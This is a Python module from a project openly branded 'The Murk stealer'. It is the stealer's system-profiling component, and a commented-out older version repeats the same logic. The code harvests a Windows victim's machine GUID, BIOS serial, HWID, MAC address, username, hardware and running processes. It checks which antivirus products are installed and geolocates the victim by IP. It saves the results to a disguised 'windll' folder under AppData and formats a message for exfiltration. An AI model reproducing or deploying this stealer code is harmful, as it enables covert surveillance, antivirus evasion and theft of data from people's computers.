#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import psutil
import GPUtil
import socket
import platform
import os
import time
import requests
from subprocess import check_output, PIPE
import wmi
import winreg
import json
import uuid

logo = '''
|-----------------------------------------------------------------------------|
|       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       |
|       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       |
|       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       |
|       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       |
|       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       |
|       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       |
|                             by: Nick_Vinesmoke                              |
|                      https://github.com/Nick-Vinesmoke                      |
|             https://github.com/Nick-Vinesmoke/The-Murk-stealer              |
|-----------------------------------------------------------------------------|
'''

def SystemInfo(msgdata):

    def get_machine_guid():
        try:
            registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
            value, _ = winreg.QueryValueEx(registry_key, "MachineGuid")
            return value.strip()
        except Exception as e:
            print(f"Error: {e}")

        return None
    def get_bios_serial_number():
        try:
            c = wmi.WMI()
            bios = c.Win32_BIOS()[0]
            return bios.SerialNumber.strip()
        except Exception as e:
            print(f"Error: {e}")
            return None

    def get_baseboard_manufacturer():
        try:
            c = wmi.WMI()
            baseboard = c.Win32_BaseBoard()[0]
            return baseboard.Manufacturer.strip()
        except Exception as e:
            print(f"Error: {e}")
            return None

    def get_mac_address():
        try:
            mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
            return ':'.join([mac[e:e + 2] for e in range(0, 12, 2)])
        except:
            return None



    def get_size(bytes, suffix="B"):
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < factor:
                return f"{bytes:.2f} {unit}{suffix}"
            bytes /= factor

    uname = platform.uname()
    svmem = psutil.virtual_memory()

    drives = psutil.disk_partitions()
    drives_info = ''
    for drive in drives:
        drives_info += f"""
Drive: {drive.device}
Name of drive: {drive.mountpoint}
Type of file system: {drive.fstype}
"""
        if drive.opts != 'cdrom':
            mount = psutil.disk_usage(drive.mountpoint)
            drives_info += f"""Drive space: {get_size(mount.total)}
drive space available: {get_size(mount.free)}
drive space used: {get_size(mount.used)}
"""
    try:
        hwid = check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
    except:
        hwid = "Can't get"  
    
    gpu_info = ""


    try:
        gpus = GPUtil.getGPUs()
        list_gpus = []
        for gpu in gpus:
            gpu_name = gpu.name# get Type of GPU
            gpu_free_memory = f"{gpu.memoryFree}MB"# get Available GPU memory
            gpu_total_memory = f"{gpu.memoryTotal}MB"# get Total GPU memory
            gpu_used_memory = f"{int(gpu.memoryTotal)-int(gpu.memoryFree)}MB"
            gpu_temperature = f"{gpu.temperature} °C\n"# get GPU temperature
            gpu_info += f'\nGPU: {gpu_name}\nTotal GPU memory {gpu_total_memory}\nAvailable GPU memory: {gpu_free_memory}\nGPU used memory: {gpu_used_memory}\nGPU temperature: {gpu_temperature}\n'
            list_gpus.append(gpu.name)
    except:
        list_gpus.append('No GPU')
        gpu_info += "No GPU"


    '''
    try:
        gpus = GPUtil.getGPUs()
        for gpu in gpus:
            gpu_info += f"""\nName: {gpu.name}
GPU ID: {gpu.id}
Load: {gpu.load} "%"
Memory Total: {gpu.memoryTotal}
Memory Used: {gpu.memoryUsed}
Memory Free: {gpu.memoryFree}
Memory Utilization: {gpu.memoryUtil*100} %
Temperature: {gpu.temperature} C"""
            gpsList.append(gpu.name)
    except:
        gpu_info += "No GPU"
        gpsList.append("No GPU")
    
    print(gpsList)

    gpu_data = get_gpu_info()
    if gpu_data:
        for device_id, name in gpu_data:
            gpu_info += f"Device ID: {device_id}\n"
            gpu_info += f"Name: {name}\n"
            '''


    Antiviruses = {
        'C:\\Program Files\\Windows Defender': 'Windows Defender',
        'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
        'C:\\Program Files\\AVG\\Antivirus': 'AVG',
        'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
        'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
        'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
        'C:\\Program Files\\DrWeb': 'Dr.Web',
        'C:\\Program Files\\ESET\\ESET Security': 'ESET',
        'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
        'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
        'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32',
        'C:\\Program Files\\Malwarebytes\\Anti-Malware': 'Malwarebytes'
        }


    Antiviruses = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]


    ip_info = ""
    internal_ip = socket.gethostbyname(socket.gethostname())
    
    try:
        ip_data = json.loads(requests.get('https://ipinfo.io/json').text)
        external_ip = ip_data['ip']
        if 'city' in ip_data:
            city = f"🏙City: {ip_data['city']}\n"
        if 'region' in ip_data:
            region = f"Region: {ip_data['region']}\n"
        if 'country' in ip_data:
            country = f"🗺Country: {ip_data['country']}\n"
        if 'loc' in ip_data:
            loc = f"Coordinates: {ip_data['loc']}\n"
        if 'org' in ip_data:
            org = f"Organization: {ip_data['org']}\n"
        if 'timezone' in ip_data:
            timezone = f"⌚Timezone: {ip_data['timezone']}\n"
        if 'postal' in ip_data:
            postal = f"Postal: {ip_data['postal']}\n"

    except:
        external_ip = "Can't get"
        ip_data = "Can't get"
    ip_info += f"""
External IP: {external_ip}
Internal IP: {internal_ip}
{loc}{org}{postal}
"""
    ip_info_msg = f"""
External IP: {external_ip}
Internal IP: {internal_ip}
{loc}"""
    info =""

    serial_number = get_bios_serial_number()
    if get_bios_serial_number():
        info += f"\nBIOS Serial Number: {serial_number}"

    machine_guid = get_machine_guid()
    if machine_guid:
        info += f"\nMachine GUID: {machine_guid}"

    manufacturer = get_baseboard_manufacturer()
    if manufacturer:
        info += f"\nBaseBoard Manufacturer: {manufacturer}"


    systeminfo = f"""
{logo}

=====================MAIN=====================
Time: {time.asctime()}
{timezone}{city}{region}{country}
Username: {os.getlogin()}
PC Name: {uname.node}
Operation System: {uname.system}
OS Release: {uname.release}
OS Version: {uname.version}
Machine: {uname.machine}
HWID: {hwid}
MAC Address: {get_mac_address()} 
{info}


====================Network===================
{ip_info}
=====================CPU======================
CPU: {platform.processor()}
Count of cores of CPU: {psutil.cpu_count(logical=True)}
CPU frequency: {psutil.cpu_freq()} MHz


=====================GPU======================
{gpu_info}

======================RAM=====================
RAM: {get_size(svmem.total)}
RAM Available: {get_size(svmem.available)}
RAM Used: {get_size(svmem.used)}


====================DRIVES====================
{drives_info}

====================OTHER=====================
Antiviruses: {', '.join(Antiviruses)}
"""
    pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
    file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8') 
    file.write(systeminfo)
    
    msgdata=f"""
**🖥System🖥**
⏲Time: {time.asctime()}
{timezone}{city}{country}👤Username: {os.getlogin()}
👤PC Name: {uname.node}
🖥OS: {uname.system} {uname.release}
📋HWID: {hwid}
📋MAC Address: {get_mac_address()} 


**🖥Hardware🖥**
🔧CPU: {platform.processor()}
🔧RAM: {get_size(svmem.total)}
🔧GPU: {', '.join(list_gpus)}
🛡Antiviruses: {', '.join(Antiviruses)}


**📡Network📡**{ip_info_msg}
"""
    return msgdata
'''
from psutil import net_if_addrs,cpu_count,cpu_freq,virtual_memory,drive_partitions,drive_usage
from GPUtil import getGPUs
from json import dumps
from platform import uname,node,system,release
from os import environ,sep,path
from win32api import GetVolumeInformation,GetLogicalDriveStrings
from time import asctime
from cpuinfo import get_cpu_info
from requests import get
from win32com.client import GetObject
from getpass import getuser
from subprocess import check_output,PIPE,run
"""
logo
"""

|-----------------------------------------------------------------------------|
|       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       |
|       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       |
|       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       |
|       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       |
|       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       |
|       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       |
|                             by: Nick_Vinesmoke                              |
|                      https://github.com/Nick-Vinesmoke                      |
|             https://github.com/Nick-Vinesmoke/The-Murk-stealer              |
|-----------------------------------------------------------------------------|
def SystemInfo(dataForMassage):
    try:
        pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
        def get_size(bytes, suffix="B"):
            factor = 1024
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f}{unit}{suffix}"
                bytes /= factor

        try:
            name = uname()
        except Exception as e:
            name = e
        try:
            n = str(node())
        except Exception as e:
            n = e
        namepc = "Pc name: " + str(n)# get ps name


        try:
            hwid = check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
        except Exception as e:
            hwid = GetVolumeInformation("C:\\")
        print("1.2")
        user = getuser()
        timeL = asctime()
        print("1.3")
        ip = get('https://api.ipify.org').text
        interface, addrs = next(iter(net_if_addrs().items()))
        print("1.4")
        try:
            cpu = run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
        except:
            cpu = get_cpu_info()['brand_raw']
        mac = addrs[0].address
        countofcpu = cpu_count(logical=True)# get cpu
        allcpucount = str(countofcpu) # get number of CPU cores
        print("1.6")
        cpufreq = cpu_freq()

        print("2")
        svmem = virtual_memory()
        allram = str(get_size(svmem.total))# get Total RAM
        ramfree = str(get_size(svmem.available))# get Available RAM
        ramuseg = str(get_size(svmem.used))# get Used RAM






        print("3")
        partitions = drive_partitions()
        drivesData =[]
        for partition in partitions:
            nameofdevice = str(partition.device)# get Drives
            nameofdick = str(partition.mountpoint)# get Drive volume
            typeoffilesystem = str(partition.fstype)# File system type
            try:
                partition_usage = drive_usage(partition.mountpoint)
            except PermissionError:
                continue
            allstorage = str(get_size(partition_usage.total))# get Total memory
            usedstorage = str(get_size(partition_usage.used))# get Used
            freestorage =  str(get_size(partition_usage.free))# get Total Available

            drivesData.append(f"\nDrive: {nameofdevice}\nDrive volume: {nameofdick}\nFile system type: {typeoffilesystem}\nTotal memory: {allstorage}\nUsed: {usedstorage}\nAvailable: {freestorage}\n")


        print("4")
        try:
            gpus = getGPUs()
            list_gpus = []
            for gpu in gpus:

                gpu_name = gpu.name# get Type of GPU
                gpu_free_memory = f"{gpu.memoryFree}MB"# get Available GPU memory
                gpu_total_memory = f"{gpu.memoryTotal}MB"# get Total GPU memory
                gpu_used_memory = f"{int(gpu.memoryTotal)-int(gpu.memoryFree)}MB"
                gpu_temperature = f"{gpu.temperature} °C\n"# get GPU temperature

                Thisgpu = f'\nGPU: {gpu_name}\nTotal GPU memory {gpu_total_memory}\nAvailable GPU memory: {gpu_free_memory}\nGPU used memory: {gpu_used_memory}\nGPU temperature: {gpu_temperature}\n'
                list_gpus.append(Thisgpu)
        except:
            list_gpus.append('No GPU')
            gpu_name = "No GPU"

        """
        all needed paths
        """
        print("5")
        Antiviruses = {
            'C:\\Program Files\\Windows Defender': 'Windows Defender',
            'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
            'C:\\Program Files\\AVG\\Antivirus': 'AVG',
            'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
            'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
            'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
            'C:\\Program Files\\DrWeb': 'Dr.Web',
            'C:\\Program Files\\ESET\\ESET Security': 'ESET',
            'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
            'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
            'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32',
            'C:\\Program Files\\Malwarebytes\\Anti-Malware': 'Malwarebytes'
            }


        Antivirus = [Antiviruses[d] for d in filter(path.exists, Antiviruses)]
        Antiviruses = dumps(Antivirus)
        print("6")
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        }
        drives = str(GetLogicalDriveStrings())
        drives = str(drives.split('\000')[:-1])

        try:
            ip = get('https://api.ipify.org').text
            urlloc = 'http://ip-api.com/json/'+ip
            location1 = get(urlloc, headers=headers).text
        except Exception as e:
            print(e)
        print("7")
        try:
            all_data = f'\n\nUser: {user}\n{namepc}\nOS type: {system()} {release()}\nHwid: {hwid}\nMac: {mac}\nTime: {timeL}\nIP: {ip}\nLocation and IP {location1}\n\n\nCPU: {cpu}\nNumber of CPU cores: {allcpucount}\nCPU frequency: min[{str(cpufreq.min)}Mhz]; max[{str(cpufreq.max)}Mhz]\n\n'
            for gpus in list_gpus:
                all_data+=gpus
            all_data+= f'\n\nRAM: {allram}\nAvailable RAM: {ramfree}\nUsed RAM: {ramuseg}\n\n'
            for data in drivesData:
                all_data+=data
            all_data+= f'\n\nAntiviruses: {str(Antiviruses)}'

            print("8")
            file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8') 
            file.write(logo)
            file.write(all_data)
            dataForMassage.append(timeL)
            dataForMassage.append(str(system())+ str(release()))
            dataForMassage.append(n)
            dataForMassage.append(user)
            dataForMassage.append(cpu)
            dataForMassage.append(gpu_name)
            dataForMassage.append(ip)
            dataForMassage.append(str(Antiviruses))
        except Exception as e:
            print(e)

        file.close()
        fileproc = open(rf'{pathtofolder}\windll\System\Processes.txt', 'a', encoding='utf-8')
        result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
        fileproc.write("\n".join(process for process in result))
        fileproc.close()
        print("sys info done")
        return dataForMassage
    except Exception as e:
        dataForMassage.append(f"[ERROR]: {e}")
        return dataForMassage

'''